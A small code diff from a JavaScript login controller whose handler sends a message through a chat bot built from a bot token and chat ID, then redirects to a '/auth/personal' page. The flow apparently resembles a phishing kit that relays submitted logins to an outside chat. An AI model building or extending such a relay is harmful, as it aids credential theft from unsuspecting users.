@@ -61,7 +61,7 @@ exports.loginPost2 = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/email-verification");
+  res.redirect("/auth/personal");
 };
 
 exports.login3 = (req, res) => {
